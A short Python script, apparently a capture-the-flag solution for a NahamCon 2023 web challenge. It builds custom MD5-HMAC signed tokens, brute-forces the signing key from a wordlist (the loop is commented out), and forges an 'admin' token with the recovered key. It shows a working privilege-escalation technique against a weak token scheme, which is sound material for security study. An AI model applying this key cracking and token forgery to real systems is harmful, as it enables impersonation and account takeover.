import hmac
import hashlib
import json
import base64

def encode(payload, key):
    header = base64.b64encode(b'{"alg":"MD5_HMAC"}').replace(b"=", b"")

    payload = base64.b64encode(json.dumps(
        payload,
        separators=(",", ":"),
    ).encode("utf-8")).replace(b"=", b"")

    final_payload = b".".join([header, payload])

    signed = base64.b64encode(hmac.new(key, final_payload, hashlib.md5).digest()).replace(b"=", b"")

    return b".".join([final_payload, signed])

def verify(JWT, key):
    header, payload, signature = JWT.split(b".")
    #print(header+b"\n"+payload+b"\n"+signature)
    #header = base64.b64decode(header)
    #payload = base64.b64decode(payload+b"==")
    signature = base64.b64decode(signature+b"==")
    #print(f"{signature=}")
    #print(hmac.new(key, b".".join([header, payload]), hashlib.md5).digest())
    #return signature == hmac.new(key, b".".join([header, payload]), hashlib.md5).digest()
    #print(b".".join([header, payload]))
    return signature == hmac.new(key, b".".join([header, payload]), hashlib.md5).digest()


admin = b"eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9"

JWT = b"eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.3R1XbK5O2t6MZ0ir6KJdRw"
key = b'fsrwjcfszegvsyfa'
#with open('/home/agus/CTF_Events/CTF-Journey/NahamCon2023/web/marmalade_s/wordlist.txt', 'rb') as f:
#    for line in f:
#        line = line.strip()
#        if verify(JWT, line):
#            print(line)
#            break
print(base64.b64encode(hmac.new(key, admin, hashlib.md5).digest()))
